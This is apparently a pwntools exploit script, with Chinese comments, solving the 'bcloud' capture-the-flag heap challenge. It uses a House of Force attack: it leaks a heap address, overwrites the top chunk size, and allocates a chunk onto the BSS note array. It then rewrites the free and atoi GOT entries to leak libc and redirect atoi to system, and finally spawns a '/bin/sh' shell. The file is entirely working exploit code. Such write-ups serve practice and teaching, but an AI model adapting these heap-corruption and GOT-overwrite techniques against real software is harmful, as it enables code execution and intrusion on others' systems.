# -*- coding=utf-8 -*-
from pwn import *

context.log_level = "debug"

p = process("./bcloud.9a3bd1d30276b501a51ac8931b3e43c4")
elf = ELF("./bcloud.9a3bd1d30276b501a51ac8931b3e43c4")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")


def new_note(length,content):
	p.recvuntil("option--->>")
	p.sendline("1")
	p.recvuntil("content:")
	print "length: " + str(length)+"->"+hex(length)
	p.sendline(str(length))
	p.recvuntil("content:")
	p.sendline(content)	

def edit_note(i,content):
	p.recvuntil("option--->>")
	p.sendline("3")
	p.recvuntil("Input the id:\n")
	p.sendline(i)
	p.recvuntil("content:\n")
	p.sendline(content)
	p.recvuntil("success.")

def delete_note(i):
	p.recvuntil("option--->>")
	p.sendline("4")
	p.recvuntil("Input the id:\n")
	p.sendline(i)
		
def pwn_top_chunk():
	p.recvuntil("Input your name:\n")
	p.send('a'*0x40)
	p.read(0x44)
	heap = u32(p.read(4))
	print "heap address: "+ hex(heap)
	p.recvuntil("Org:")
	p.send('a'*0x40)
	p.recvuntil("Host:")
	p.sendline(p32(0xffffffff))
		
	p.recvuntil("Enjoy:")

	return heap
if __name__=="__main__":
	heap = pwn_top_chunk()#修改top_chunk的大小
	
	gdb.attach(p)	
# Plan - step 1: Request a chunk to reach the BSS
	pause()	
	new_note(0x10,"test") #一共需要三个note，不分配的话，note长度为0，不能进行edit

	top_chunk = heap -8 + 0x48*3 + 0x18
	bss_address=  0x804B118 - 8
	#size = 0x10804B118 - top_chunk
	size = top_chunk - bss_address   #使其分配到bss上存放note的地址，后续可操作每个note
	new_note(-size,"test")   #修改top_chunk的地址
	
	payload = p32(elf.got["free"])
	payload += p32(elf.got["atoi"])
	payload += p32(elf.got["atoi"])

	new_note(0x100,payload)	

	edit_note("0",p32(elf.plt['printf'])) #第一个note用于将.plt.printf地址覆盖到.got.free上
	delete_note("1") # 第二note用于执行printf .got.atoi存放的地址，做泄露用

	atoi_address = u32(p.read(4))

	libc_base = atoi_address - libc.symbols['atoi']
	print "libc_base address: " + hex(libc_base)

	system_address = libc_base + libc.symbols['system']
	
	print "system_address: " + hex(system_address)

	edit_note("2",p32(system_address)) #第三个note用于将atoi的地址覆盖成system的地址

	p.sendline("/bin/sh\0")
	
	p.interactive()
